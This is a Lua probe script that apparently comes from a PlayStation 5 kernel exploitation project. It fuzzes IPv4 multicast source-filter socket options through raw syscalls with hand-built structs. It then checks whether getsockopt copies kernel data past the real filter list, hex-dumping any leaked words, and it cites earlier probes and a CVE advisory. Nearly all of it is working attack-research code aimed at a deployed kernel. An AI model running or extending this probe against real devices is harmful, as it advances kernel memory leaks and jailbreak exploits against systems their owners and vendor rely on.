-- CRASH_CLASS: MODERATE
-- PROBE 1431a: the IPv4 multicast source-filter family, with correct structs
--
-- Why: IPV6_MSFILTER(74) was recorded as a dead end for months because every
-- test passed a misaligned 148-byte __msfilterreq. 50f refuted it with the
-- amd64 layout, and 1427a/1428a then found getsockopt(74) reads the live filter
-- list back.  The same "uniformly -1" verdict was recorded for the *whole*
-- multicast family in 50e2/50e3 - MCAST_JOIN_GROUP(42), MCAST_BLOCK_SOURCE(43),
-- MCAST_MSFILTER(72) - but each of those takes a DIFFERENT struct
-- (group_req / group_source_req / __msfilterreq) that was never tried in the
-- right shape.  So the v4 side is an untested surface with history's exact
-- failure mode.
--
-- It matters because netinet/in_mcast.c is a separate implementation from
-- in6_mcast.c, and the CVE-2026-49412 advisory says the v4 race was only
-- mitigated by the global multicast lock, i.e. it is structurally racier.
--
-- What this probe measures, on AF_INET:
--   [A] join an IPv4 group (ip_mreq, 8 bytes) - the precondition everything else needs
--   [B] option sweep 40..80 at level IPPROTO_IP with a correct 152-byte __msfilterreq,
--       reporting rv, the returned numsrc and the changed-dword count
--   [C] for every option that answered 0: the caller-count test (claim 1 vs 128)
--       with a pattern-filled buffer, i.e. the v4 twin of 1428a
--   [D] MCAST_JOIN_SOURCE_GROUP(46) / MCAST_BLOCK_SOURCE(43) with a correct
--       group_source_req (interface + group + source, 264 bytes)
--
-- Prior art:
--   50f results/phase11_network_attacks/50f_ipv6_msfilter_aligned_20261022_183727.txt
--       the aligned v6 struct works: join 0, INCLUDE 1src 0, 148-byte struct -1
--   50e2/50e3 (phase11) MCAST_MSFILTER(72), MCAST_JOIN_GROUP(42),
--       MCAST_BLOCK_SOURCE(43) all -1 at every size 4..512 - WRONG STRUCTS
--   1427a results/phase36_realargs/1427a_msfilter_readback_20261109_162242.txt
--       v6 readback works per group, 128 sources accepted, 129 ENOSPC(55)
--   1428a .../1428a_msfilter_readback_count_20261109_162635.txt
--       v6 copy length = caller's numsrc: claim 0 -> 0 dwords, 1 -> 32, 128 -> 4096
--   docs/CVE-2026-49412-PS5-14.10.md

print("=== PROBE 1431a: IPV4 MSFILTER FAMILY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function z(p, n) for i = 0, n - 1 do memory.write_byte(p + i, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function d(p, i, v) memory.write_dword(p + i, v) end
local function rd(p, i) return to_num(memory.read_dword(p + i)) end

local AF_INET, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IP = 2, 2, 17, 0
local socket, getsockopt, setsockopt = sc(97), sc(118), sc(105)
local getpid = sc(20)

local function map(len, prot)
    local va = to_num(sc(477)(uint64(0), uint64(len), uint64(prot or 3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if va < 0x10000 or va > 0x8000000000 then return nil end
    return va
end

local req = memory.alloc(0x200)     -- __msfilterreq / group_source_req scratch
local glen = memory.alloc(16)
local dst = map(0x40000)            -- 256 KiB readback target
local src = map(0x8000)             -- source array
assert(dst and src, "mmap failed")
local PAT = 0xA5A5A5A5

local function fill_pat(dwords)
    for i = 0, dwords - 1 do memory.write_dword(dst + i * 4, PAT) end
end
-- count dwords that differ from the pattern, and dwords that are neither the
-- pattern nor zero  (a plain 'changed' count cannot tell a failed fill from a
-- kernel zero-fill, so both numbers are always printed)
local function scan_dst(dwords)
    local ch, nz, first = 0, 0, -1
    for i = 0, dwords - 1 do
        local w = rd(dst, i * 4)
        if w ~= PAT then
            ch = ch + 1
            if w ~= 0 then
                nz = nz + 1
                if first < 0 then first = i * 4 end
            end
        end
    end
    return ch, nz, first
end

local pid = to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("pid=%d dst=0x%X src=0x%X", pid, dst, src))
print("")

local function fd_new()
    local fd = to_num(socket(uint64(AF_INET), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 or fd > 4096 then return nil end
    return fd
end

-- struct ip_mreq { in_addr imr_multiaddr; in_addr imr_interface; }
-- 224.0.0.1 = E0 00 00 01
local function group4(p, off, addr1)
    z(p + off, 16)
    b(p + off + 0, 16)          -- sin_len
    b(p + off + 1, AF_INET)     -- sin_family
    b(p + off + 4, 0xE0)
    b(p + off + 7, addr1)
end

local function join4(fd, addr1, opt)
    local m = memory.alloc(16)
    z(m, 16)
    b(m, 0, 0xE0); b(m, 3, addr1)   -- imr_multiaddr, imr_interface stays 0
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IP), uint64(opt), uint64(m), uint64(8))
    end)
    if ok then rv = to_num(r) end
    return rv
end

-- one source entry: 128-byte sockaddr_storage with sockaddr_in at the front
local function fill_sources4(n, base)
    local cap = n > 0 and n or 1
    z(src, cap * 128)
    for i = 0, cap - 1 do
        local e = src + i * 128
        b(e, 0, 16)
        b(e, 1, AF_INET)
        b(e, 4, 0xE0)
        b(e, 7, (base + i) % 256)
    end
end

local function prep4(tag, mode, nsrc, sa)
    z(req, 160)
    d(req, 0, 0)                       -- ifindex 0 = default route
    d(req, 4, mode)
    d(req, 8, nsrc)
    group4(req, 16, tag)
    memory.write_qword(req + 144, uint64(sa or 0))
end

local function set_opt(fd, level, opt, nsrc, tag)
    fill_sources4(nsrc > 0 and nsrc or 1, 0x10)
    prep4(tag, 1, nsrc, src)
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(level), uint64(opt), uint64(req), uint64(152))
    end)
    if ok then rv = to_num(r) end
    return rv
end

-- get with an explicit claim, scanning a FIXED window so a short copy and a
-- zero-fill are distinguishable
local function get_opt(fd, level, opt, tag, claim, window)
    prep4(tag, 1, claim, dst)
    fill_pat(window)
    d(glen, 0, 152)
    local rv = -999
    local ok, r = pcall(function()
        return getsockopt(uint64(fd), uint64(level), uint64(opt),
            uint64(req), uint64(glen), uint64(0))
    end)
    if ok then rv = to_num(r) end
    local ch, nz, first = scan_dst(window)
    return rv, rd(req, 8), ch, nz, first
end

-- ---------------------------------------------------------------------
print("[A] join an IPv4 group (ip_mreq = 8 bytes)")
local fdA = fd_new()
assert(fdA, "no ipv4 socket")
local joined = join4(fdA, 0x01, 12)      -- IP_ADD_MEMBERSHIP = 12
print(string.format("  socket=%d  IP_ADD_MEMBERSHIP(12) = %d", fdA, joined))
if joined ~= 0 then
    print("  retry with 224.0.0.251")
    joined = join4(fdA, 0xFB, 12)
    print(string.format("  224.0.0.251 = %d", joined))
end

-- ---------------------------------------------------------------------
print("")
print("[B] option sweep at level IPPROTO_IP with a correct __msfilterreq")
local live = {}
for opt = 40, 80 do
    local rv = set_opt(fdA, IPPROTO_IP, opt, 1, 0x01)
    local g, numsrc, ch, nz = get_opt(fdA, IPPROTO_IP, opt, 0x01, 1, 64)
    if rv == 0 or g == 0 or ch > 0 then
        print(string.format("  opt=%2d  set=%d  get=%d numsrc=%d changed=%d nonzero=%d",
            opt, rv, g, numsrc, ch, nz))
        if g == 0 then live[#live + 1] = opt end
    end
end
print(string.format("  live getsockopt options: %d", #live))

-- ---------------------------------------------------------------------
print("")
print("[C] caller-count test on every live option (claim 1 vs claim 128)")
for _, opt in ipairs(live) do
    local rv1, n1, ch1, nz1 = get_opt(fdA, IPPROTO_IP, opt, 0x01, 1, 4096)
    local rv128, n128, ch128, nz128, f128 = get_opt(fdA, IPPROTO_IP, opt, 0x01, 128, 4096)
    print(string.format("  opt=%2d claim=1   rv=%d numsrc=%d changed=%4d nonzero=%d", opt, rv1, n1, ch1, nz1))
    print(string.format("  opt=%2d claim=128 rv=%d numsrc=%d changed=%4d nonzero=%d first=%d",
        opt, rv128, n128, ch128, nz128, f128))
    if nz128 > 0 then
        print("  >>> NON-ZERO data past the real list")
        for i = 0, 7 do
            print(string.format("    +0x%03X: %08X %08X %08X %08X", f128 + i * 16,
                rd(dst, f128 + i * 16), rd(dst, f128 + i * 16 + 4),
                rd(dst, f128 + i * 16 + 8), rd(dst, f128 + i * 16 + 12)))
        end
    end
end

-- ---------------------------------------------------------------------
print("")
print("[D] group_source_req shape: interface + group + source (264 bytes)")
do
    -- struct group_source_req { u_int gsr_interface; sockaddr_storage gsr_group;
    --                           sockaddr_storage gsr_source; }
    z(req, 0x200)
    d(req, 0, 1)                      -- ifindex 1
    group4(req, 8, 0x01)              -- group 224.0.0.1
    group4(req, 8 + 128, 0x02)        -- source 224.0.0.2
    for _, opt in ipairs({ 42, 43, 44, 45, 46, 47, 48, 72, 74 }) do
        local rv = -999
        local ok, r = pcall(function()
            return setsockopt(uint64(fdA), uint64(IPPROTO_IP), uint64(opt),
                uint64(req), uint64(264))
        end)
        if ok then rv = to_num(r) end
        print(string.format("  group_source_req opt=%2d -> rv=%d errno=%s", opt, rv, es()))
    end
end

print("")
print("=== PROBE 1431a COMPLETE ===")
